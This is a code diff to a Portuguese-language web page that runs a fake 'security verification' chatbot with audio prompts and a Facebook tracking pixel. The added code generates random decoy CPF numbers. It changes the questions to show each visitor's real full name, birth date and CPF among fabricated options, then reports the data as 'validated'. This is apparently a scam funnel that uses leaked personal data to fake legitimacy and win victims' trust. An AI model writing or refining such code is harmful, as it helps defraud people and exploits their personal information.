@@ -532,6 +532,16 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
         while (out.size < 4) out.add(pad(1 + Math.floor(Math.random()*28)) + '/' + pad(1 + Math.floor(Math.random()*12)) + '/' + (y + Math.floor(Math.random()*21) - 10));
         return [...out].sort(() => Math.random() - 0.5);
     }
+    function fakeCpfs(real) {
+        const pad = n => String(n).padStart(2, '0');
+        const gen = () => {
+            const n = Array.from({length: 11}, () => Math.floor(Math.random()*10)).join('');
+            return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        };
+        const out = new Set(real ? [real] : []);
+        while (out.size < 4) out.add(gen());
+        return [...out].sort(() => Math.random() - 0.5);
+    }
     const FAKE_NAMES = ['Roberta Oliveira Costa','Tereza Tomaz das Neves','Fernanda Cunha Ferreira','Maria Aparecida Souza','Sandra Regina Lima','Lúcia Helena Martins'];
     async function runScript() {
         const d = getDados();
@@ -539,16 +549,16 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
         await sayAudio('a1.mp3');
         await say('<strong>ATENÇÃO ❗</strong> Responda as perguntas abaixo corretamente para podermos continuar.');
 
-        await say('<strong>Pergunta de segurança 1:</strong>', 700);
+        await say('<strong>Pergunta de segurança 1 — Qual é o seu nome completo?</strong>', 700);
         const fakes = FAKE_NAMES.sort(() => Math.random() - 0.5).slice(0, 3);
-        const names = (d.mae ? [...fakes, tc(d.mae)] : [...fakes, FAKE_NAMES[3]]).sort(() => Math.random() - 0.5);
+        const names = (d.nome ? [...fakes, tc(d.nome)] : [...fakes, FAKE_NAMES[3]]).sort(() => Math.random() - 0.5);
         await ask([...names, 'Nenhum dos nomes acima']);
 
-        await say('<strong>Pergunta de segurança 2:</strong>', 700);
+        await say('<strong>Pergunta de segurança 2 — Qual é a sua data de nascimento?</strong>', 700);
         await ask(fakeDates(d.nasc), 'grid');
 
-        await say('<strong>Pergunta de segurança 3:</strong>', 700);
-        await ask(['Solteiro(a)','Casado(a)','Viuvo(a)','Separado(a) judicialmente','Em relação estável']);
+        await say('<strong>Pergunta de segurança 3 — Qual é o seu CPF?</strong>', 700);
+        await ask(fakeCpfs(d.cpf), 'grid');
 
         await card({ loading: 'Validando dados...', done: 'Dados validados com sucesso!' }, 2600);
         await sayAudio('a2.mp3');
